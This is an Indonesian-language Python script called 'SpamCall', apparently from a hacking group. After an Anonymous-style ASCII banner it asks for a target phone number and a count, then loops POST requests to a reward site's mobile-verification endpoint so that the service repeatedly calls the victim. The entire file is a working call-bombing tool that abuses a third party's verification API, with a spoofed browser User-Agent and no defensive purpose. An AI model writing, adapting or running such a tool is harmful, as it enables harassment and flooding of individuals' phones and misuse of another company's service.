

# module
import os,sys,time,requests
from time import sleep


# tampilan
os.system("clear")
os.system("figlet SpamCall")
banner= """
                   .-/+osssso+/-`
             `/sdNMMMMMMMMMMMMMMNds/`
          .odMMMMMMMMMMMMMMMMMMMMMMMMdo.
        :hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh:
      -dMMMNmMMMMMMMNNNNNNNNNNMMMMMMMmNMMMd-
    `sMNNs-oMMMMNNNNNNNNNNNNNNNNNNMMMMo-sNNMs
   `dM+s-:sMMMNNNNNNMMNMNNMNMMNNNNNNMMMs-:s+Md`
  `mho.h/:dMNNMMMNMMNmNoso-dmNMMNMMMNNMd:/d`ohm`
  hs//::oMMNMMMMNMMMMNMmmo+NNMMMMNMMMMNMNo:-+:yh
 /M--y+:hMNNNNNNNMMMNNMMmmMMNMMMMNNNNNNNMh:oy.:M:
 dd+./.hMNMMMMMNMMMNNNNNooNNNNNMMMNMMMMMNMy./.odh
`M-m-/yyMNMMMMMNMMMMNMNdssdNMNMMMMNMMMMMNMyy/-m-N
`M:-ho`NMNNNNNNNNNmho-sN:/Ms-shmNNNNNNNNNMm`sh-/M`
`Mh`+ sdMNMMMMMh`     NMosMN     `dMMMMMNMdo`/`hN
 d/h/.m.MNMMMMM+      yM--My      oMMMMMNM.m`/h/h
 /d`/ss mNNNNNN-      `d.-h`      -NNNNNNd ss/`d:
  hm/`+ d:mNMMN                    NMMNd:h`+`/mh
  `doss/++.mNNh                    hNNm`o//ssod`
   `ds.:+y-:sso                    osy:-y+--sd`
     sMy+/:./+                      +/.:/+yMs
      -dyo/////.```            ```./////ohh-
        :hMhoosss/`            `/sssoohMh:
          .ohysoos.            .soosyh+`
             `/sdN`            `Nds/`
              [      ANONYMOUS     ]
==================================================================
[•] Creator : Mr.15XCyber
[•] Team    : ANONYMOUS INDONESIA
[•] Pesan   : Gunakan Tools Ini Dengan Baik
================================================================="""
sleep(1)
print(banner)
nomor = input("Nomor Target: ")
jumlah = int(input("Jumlah Spam: "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))

